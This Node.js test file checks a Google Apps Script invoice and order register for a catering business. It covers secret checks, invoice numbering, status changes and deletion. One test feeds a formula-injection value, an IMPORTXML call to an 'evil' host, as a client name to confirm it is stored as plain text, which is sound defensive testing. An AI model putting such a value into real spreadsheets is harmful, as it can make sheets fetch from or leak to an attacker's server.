import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { test } from 'node:test';
import vm from 'node:vm';

// Runs scripts/google-sheets-orders.gs against a small in-memory stand-in for Google Sheets.
function fakeGoogle() {
  const books = new Map();
  const display = value => value instanceof Date ? value.toISOString() : value === '' || value == null ? '' : String(value).replace(/^'/, '');
  const sheet = name => {
    const rows = [];
    const cell = (r, c) => (rows[r - 1] ?? [])[c - 1] ?? '';
    const range = (r, c, nr = 1, nc = 1) => ({
      getValues: () => Array.from({ length: nr }, (_, i) => Array.from({ length: nc }, (_, j) => cell(r + i, c + j))),
      getDisplayValues: () => Array.from({ length: nr }, (_, i) => Array.from({ length: nc }, (_, j) => display(cell(r + i, c + j)))),
      getValue: () => cell(r, c),
      setValue: v => { (rows[r - 1] ??= [])[c - 1] = v; },
      setValues: vs => vs.forEach((row, i) => row.forEach((v, j) => { (rows[r + i - 1] ??= [])[c + j - 1] = v; })),
      setNumberFormat: () => {}, setFontWeight: () => {},
    });
    return { name, rows, deleteRow: r => rows.splice(r - 1, 1), appendRow: row => rows.push([...row]), getLastRow: () => rows.length, getMaxRows: () => 1000, getRange: range, setFrozenRows: () => {} };
  };
  const props = new Map();
  return {
    books,
    SpreadsheetApp: { getActiveSpreadsheet: () => ({ getSheetByName: n => books.get(n) ?? null, insertSheet: n => { const s = sheet(n); books.set(n, s); return s; } }) },
    PropertiesService: { getScriptProperties: () => ({ getProperty: k => props.get(k) ?? null, setProperty: (k, v) => props.set(k, v) }) },
    LockService: { getScriptLock: () => ({ waitLock: () => {}, releaseLock: () => {} }) },
    ContentService: { MimeType: { JSON: 'json' }, createTextOutput: text => ({ setMimeType: () => JSON.parse(text) }) },
    props,
  };
}

function load() {
  const google = fakeGoogle();
  const context = vm.createContext({ ...google, JSON, Date, String, Number, Object });
  vm.runInContext(readFileSync(resolve('scripts/google-sheets-orders.gs'), 'utf8'), context);
  return { ...google, call: body => context.doPost({ postData: { contents: JSON.stringify({ secret: 's3cret', ...body }) } }) };
}

const order = (number = '', clientName = 'Patricia') => ({
  invoice: { number, date: '2026-11-07', clientName, clientPhone: '+233 24 000 0000', clientEmail: 'p@example.com', eventType: 'Weddings', eventDate: '2026-12-12', venue: 'Accra', guests: '600', items: [], depositPercent: '70', validDays: '14', notes: '' },
  validUntil: '2026-11-21', guests: 600, items: '14 × Waiters @ 350 = 4,900', subtotal: 4900, total: 4900, depositPercent: 70, deposit: 3430, balance: 1470,
});

test('Apps Script register: numbering, statuses and safety', () => {
  const sheets = load();
  assert.deepEqual(sheets.call({ action: 'list' }), { ok: false, error: 'unauthorized' }, 'no secret configured yet');
  sheets.props.set('WEBHOOK_SECRET', 's3cret');
  assert.deepEqual(sheets.call({ secret: 'wrong', action: 'list' }), { ok: false, error: 'unauthorized' });

  // Numbers are issued in sequence and never reused.
  const year = new Date().getFullYear();
  const first = sheets.call({ action: 'save', order: order() });
  const second = sheets.call({ action: 'save', order: order('', 'Kofi') });
  assert.deepEqual([first.number, first.status], [`GC-${year}-0001`, 'Quote']);
  assert.equal(second.number, `GC-${year}-0002`);
  assert.equal(sheets.call({ action: 'save', order: order(`GC-${year}-0999`) }).error, 'unknown invoice', 'numbers only come from the register');

  // Saving again updates the same row instead of issuing a new number.
  const resaved = sheets.call({ action: 'save', order: order(first.number, 'Patricia Mensah') });
  assert.deepEqual([resaved.number, resaved.row], [first.number, first.row]);
  const invoices = sheets.books.get('Invoices');
  assert.equal(invoices.rows.length, 3, 'header plus two invoices');
  assert.equal(sheets.books.get('Confirmed orders'), undefined, 'quotes are not orders');

  assert.equal(sheets.call({ action: 'paid', number: first.number }).error, 'not confirmed');
  assert.equal(sheets.call({ action: 'confirm', order: order(first.number, 'Patricia Mensah') }).status, 'Confirmed');
  assert.equal(sheets.call({ action: 'confirm', order: order(first.number, 'Patricia Mensah') }).status, 'Confirmed');
  const orders = sheets.books.get('Confirmed orders');
  assert.equal(orders.rows.length, 2, 'confirming twice keeps one order row');
  assert.equal(sheets.call({ action: 'paid', number: first.number }).status, 'Paid');
  assert.equal(orders.rows[1][2], 'Paid', 'order tab shows the payment');
  assert.equal(sheets.call({ action: 'save', order: order(first.number) }).status, 'Paid', 'editing a paid invoice keeps it paid');

  // Listing (newest first) and reopening the stored copy.
  const listed = sheets.call({ action: 'list' }).invoices;
  assert.deepEqual(listed.map(row => [row.number, row.status]), [[second.number, 'Quote'], [first.number, 'Paid']]);
  const opened = sheets.call({ action: 'get', number: second.number });
  assert.equal(opened.invoice.clientName, 'Kofi');
  assert.equal(opened.invoice.number, second.number);

  // Deleting removes the invoice and its order; the number is not reused.
  assert.equal(sheets.call({ action: 'delete', number: first.number }).ok, true);
  assert.equal(sheets.call({ action: 'get', number: first.number }).error, 'unknown invoice');
  assert.equal(sheets.call({ action: 'delete', number: first.number }).error, 'unknown invoice');
  assert.equal(orders.rows.length, 1, 'order row removed, header kept');
  assert.deepEqual(sheets.call({ action: 'list' }).invoices.map(row => row.number), [second.number]);
  assert.equal(sheets.call({ action: 'save', order: order() }).number, `GC-${year}-0003`, 'deleted numbers are not reissued');
  assert.equal(sheets.call({ action: 'delete', number: second.number }).ok, true, 'quotes without an order row delete too');

  // Formula-like text is stored as plain text.
  sheets.call({ action: 'save', order: order('', '=IMPORTXML("http://evil","//a")') });
  assert.equal(invoices.rows.at(-1)[6], '\'=IMPORTXML("http://evil","//a")');
  assert.equal(invoices.rows.at(-1)[7], "'+233 24 000 0000", 'phone numbers stay text too');
});
